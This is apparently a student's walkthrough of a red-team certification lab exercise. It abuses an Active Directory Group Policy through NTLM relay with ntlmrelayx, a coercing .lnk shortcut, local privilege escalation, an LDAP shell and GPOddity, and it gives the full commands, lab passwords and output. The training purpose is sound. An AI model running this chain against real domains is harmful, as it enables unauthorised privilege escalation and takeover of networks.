# Learning Objetive 6

<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

* Student VM - Name of the Group Policy attribute that is modified

### Invishell

```
cd \AD\Tools
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```

GPO abuse for admin access on dcorp-ci

Once we are local admin in student machine and view how we have admin priviliges into the pc "dcorp-ci", seach all GPOs in this machines with it command:

```
Get-DomainGPO -ComputerIdentity DCORP-CI

Exception calling "FindAll" with "0" argument(s): "There is no such object on the server.
"

flags                    : 0
displayname              : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 12/24/2024 7:09:01 AM
versionnumber            : 3
name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged               : 296496
dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 12/18/2024 7:31:22 AM
showinadvancedviewonly   : True
usncreated               : 293100
gpcfunctionalityversion  : 2
instancetype             : 4
objectclass              : {top, container, groupPolicyContainer}
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

It appartains to <mark style="background-color:yellow;">DevOps Policy, we can confirm it using Get-DomainGPO -Identity 'DevOps Policy'</mark> command.

> Remember the name of this GPO "DevOps Policy" 0BF8D01C-1F62-4BDC-958C-57140B67D147

#### View it with BloodHound

<figure><img src="../../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

Recall that we enumerated a user `devopsadmin` has `WriteDACL` on DevOps Policy. Let’s try to abuse this using GPOddity.

> We can see it with blood too

<figure><img src="../../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>

## Abuse an overly permissive Group Policy to get admin access on dcorp-ci.

In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access. Looking at the directory **(\\\dcorp-ci\AI)**, we will find a log file.

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/crtp-certified-red-team-professional/learning-objectives/learning-objetive-1#file-share-where-studentx-has-write-permissions" %}

<figure><img src="../../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

So... enter to the fileshare AI -->

<figure><img src="../../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'.

<figure><img src="../../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>

> Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity.

First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.

You can start a session on Ubuntu WSL by searching for wsl in the search bar or by using the Windows Terminal.

### Run Ubuntu WS

> Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the following.
>
> 1. Use <mark style="background-color:yellow;">WSLToTh3Rescue!</mark> as the sudo password.
> 2. Remember to replace the IP with your own student VM.
> 3. <mark style="background-color:yellow;">Make sure that Firewall is either turned off on the student VM or you have added exceptions.</mark>

<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

```
sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
```

> Note: I obtain DC's IP pinging it `ping DOLLARCORP.MONEYCORP.LOCAL` -> 172.16.2.1

```
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.113 --http-port '80,8080' -i --no-smb-server
```

### Create a Shortcut

On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:

<figure><img src="../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.113' -UseDefaultCredentials"
```

<figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

> Save it with us username (student 113)

Name the shortcut as studentx.lnk. Copy the lnk file to 'dcopr-ci\AI'.

```
xcopy C:\AD\Tools\student113.lnk \\dcorp-ci\AI
```

<figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

## Privileges Escalation to Disabled the Firewall

> Note: For this, we need have privileges until, so... use the escalation on LO-5

{% embed url="https://eldeim.gitbook.io/brain_fuck/checklists/certifications/crtp-certified-red-team-professional/learning-objectives/learning-objetive-5#local-privilege-escalation-winpeas" %}

### Enumerate Local Privilage Escalation

```
Invoke-AllChecks
```

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.

> Remembder use the invishelll and POWEUP modules (not poweview)

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student113' -Verbose
```

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!</mark>

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

## Execution All

> Resume: We need the local admin to desactive the firewall to then, use wsl ubuntu with reay and .lnk in the share

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

WE HAVE VISIBILITY! So... now use nc to the next time it access, get us a shell -->

> Remember leave the ntmlrelay running. And execute nc in another terminal WSL

### NC LDAP Terminal

Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}:

```
nc 127.0.0.1 11000
```

```
write_gpo_dacl student113 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

### Alternative - GPO abuse PC

Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the 'write\_gpo\_dacl' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

First, create a new computer account into the AD (using the session previous obtaining with nc/ldap)

```
add_computer std113-gpattack Secretpass@123
```

After it, set permissions at this machine

```
write_gpo_dacl std113-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

> ```
> # add_computer stdx-gpattack Secretpass@123
>
> Attempting to add a new computer with the name: stdx-gpattack$
> Inferred Domain DN: DC=dollarcorp,DC=moneycorp,DC=local
> Inferred Domain Name: dollarcorp.moneycorp.local
> New Computer DN: CN=stdx-gpattack,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
> Adding new computer with username: stdx-gpattack$ and password: Secretpass@123 result: OK
>
> # write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
>
> Adding stdx-gpattack$ to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
> LDAP server claims to have taken the secdescriptor. Have fun
> ```

Stop the ldap shell and ntlmrelayx using `Ctrl + C`.

Now, run the GPOddity command to create the new template.

## GPOddity commands

> 1️⃣ Descarga la GPO legítima desde **SYSVOL**\
> 2️⃣ Inserta una **Scheduled Task maliciosa**\
> 3️⃣ Cambia el atributo:
>
> ```
> gPCFileSysPath
> ```
>
> para que el dominio cargue tu GPO falsa desde tu máquina.

> Note: Use the same shell of nc ubuntu

```
cd /mnt/c/AD/Tools/GPOddity
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student113' --password 'Z6s8WSxsBSfsArV6' --command 'net localgroup administrators student113 /add' --rogue-smbserver-ip '172.16.100.113' --rogue-smbserver-share 'std113-gp' --dc-ip '172.16.2.1' --smb-mode none
```

> Note: Change stdx-gp to std113-gp

<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Leave GPOddity running and from another Ubuntu WSL session,</mark> create and share the std<mark style="background-color:yellow;">x</mark>-gp directory:

```
mkdir /mnt/c/AD/Tools/std113-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std113-gp
```

Great, now open a new windows shell **as administrator** to create a share (std113-gp) ad assign privileges for everyone:

<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

```
net share std113-gp=C:\AD\Tools\std113-gp /grant:Everyone,Full
icacls "C:\AD\Tools\std113-gp" /grant Everyone:F /T
```

<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

#### Tarea Resume

```
Writable share
        │ ## devopsadmin → WriteDACL → DevOps Policy
        ▼
devopsadmin ejecuta tu .lnk
        │
        ▼
NTLM Relay → theft devopsadmin
        │
        ▼
LDAP shell
        │
        ▼
add_computer
        │
        ▼
write_gpo_dacl
        │
        ▼
GPOddity modifica GPO
        │
        ▼
Scheduled Task ejecutada
        │
        ▼
student113 → Local Admin in dcorp-ci
```

## Verify if the gPCfileSysPath

> Note: Run the following PowerView command

```
Get-DomainGPO -Identity 'DevOps Policy'
```

<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">The update for this policy is configured to be every 2 minutes in the lab</mark>. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:

```
winrs -r:dcorp-ci cmd /c "set computername && set username"

COMPUTERNAME=DCORP-CI
USERNAME=student113
```
